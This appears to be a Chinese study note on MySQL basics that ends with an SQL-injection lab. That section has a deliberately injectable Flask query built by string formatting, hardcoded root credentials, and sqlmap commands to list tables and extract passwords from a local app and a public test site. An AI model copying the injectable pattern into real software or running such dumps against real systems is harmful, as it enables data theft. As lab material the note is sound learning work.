---
title: mysql数据库
date: 2023-08-30 15:52:25
---

# **常见数据库**

数据库主要分为两种：关系型数据库以及非关系型数据库

常见的**关系型数据库**有`Mysql`、`Oracal`

常见的**非关系型数据库**有`Memacach`、`Redis`

数据库排行榜

https://db-engines.com/en/ranking

# `Mysql`服务启动与关闭

启动

```
net start Mysql
```

关闭

```
net stop Mysql
```

# 连接数据库

连接数据库

```
mysql -uroot -p123456
```

# `SQL`语句分

## DQL查询

查询

```
select
```

## DML操作

```
insert
```

```
delete
```

```
update
```

对数据/记录进行增删改

## DDL定义

设计表结构

```
create
```

```
drop
```

```
alter
```

对表字段进行增删改

## TCL

事务机制

```
commit
```

```
rollback
```

事务提交以及回滚

## DCL

权限控制

```
grant
```

```
revoke
```

授权以及撤销授权

# SQL语句执行顺序

select  * from 表名 where 条件 group by 分组 having ... order by ... limit...

执行顺序

（1）from

（2）where

（3）group by

（4）having

（5）select

（6）order by

（7）limit

# 基本命令

## 退出Mysql

exit

## 查看数据库

show databases

## 使用数据库

use 库名

## 创建数据库

create database 库名

## 查看表

show tables

## 查看数据库版本号

```
select version()
```

## 查看当前使用哪个数据库

select database()

## 终止命令输入

\c

## 查看表结构

```
desc 表名
```

# 简单查询

## 查找所有字段

select * from 表名

## 多字段查找

select 字段1,字段2 from 表名

## 给字段另起名字

```
select 字段 as newName from 表名
```

`as`关键字可以省略

## 字段参与计算

```
select score/3 as avgScore from student
```

# 条件查询

语法格式

```
select * from 表名 where 条件
```

= 等于

<> != 不等于

< 小于

\>= 大于等于

between and

is null

is not null

and

or

in

not in

like

通配符% 代表任意多个字符

通配符_ 代表一个任意字符

# 排序

```
selcet * from 表名 order by 字段1 desc, 字段2 asc
```

# SQL注入

Flask Web框架

```python
from flask import Flask, request
import pymysql

app = Flask(__name__)

# 配置数据库连接信息
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = '123456'
app.config['MYSQL_DB'] = 'test'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'  # 使用DictCursor返回字典类型的结果

# 创建MySQL连接
mysql = pymysql.connect(
    host=app.config['MYSQL_HOST'],
    user=app.config['MYSQL_USER'],
    password=app.config['MYSQL_PASSWORD'],
    db=app.config['MYSQL_DB'],
    cursorclass=pymysql.cursors.DictCursor
)

# 在视图函数中执行SQL查询
@app.route('/', methods=['GET'])
def index():
    username = request.args.get('username')
    cursor = mysql.cursor()
    sql = "SELECT * FROM t_user WHERE name = %s" % username
    print(sql)
    cursor.execute(sql)
    results = cursor.fetchall()
    cursor.close()
    return str(results)

if __name__ == '__main__':
    app.run()

```

# 脚本

https://github.com/sqlmapproject/sqlmap

正常查询

在项目目录下执行命令

```
python sqlmap.py -u http://127.0.0.1:5000/?username=1 --batch
```

注入风险

# 获取网站数据库表

```
python sqlmap.py -u http://127.0.0.1:5000/?username=1 --tables
```

# 获取数据库密码

```
python sqlmap.py -u http://127.0.0.1:5000/?username=1 --password
```

# 靶向网站

http://testphp.vulnweb.com/artists.php?artist=1



